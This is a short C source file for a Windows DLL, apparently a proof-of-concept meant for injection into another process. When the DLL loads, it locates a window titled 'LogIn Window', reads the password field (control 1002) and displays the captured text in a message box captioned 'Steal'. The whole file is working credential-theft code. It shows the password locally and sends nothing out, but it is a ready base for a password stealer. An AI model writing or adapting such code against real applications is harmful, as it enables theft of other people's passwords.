#include <windows.h>

BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved )
{
/*
        __asm {
        	int 3
        }
*/
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		HWND hDialog = FindWindow(NULL, "LogIn Window");
		if (!hDialog)
		{
			MessageBox(0, "Failed to locate the password dialog", "Steal", MB_OK | MB_TASKMODAL);
		}
		else
		{
		        char cPassword[100];
			DWORD dwLen = GetDlgItemTextA(hDialog, 1002, cPassword, sizeof(cPassword));
			if (!dwLen)
			{
				MessageBox(0, "Failed to read the password", "Steal", MB_OK | MB_TASKMODAL);
			}
			else
			{
				MessageBox(0, cPassword, "Steal", MB_OK | MB_TASKMODAL);
			}
		}
	}  
	return TRUE;
}
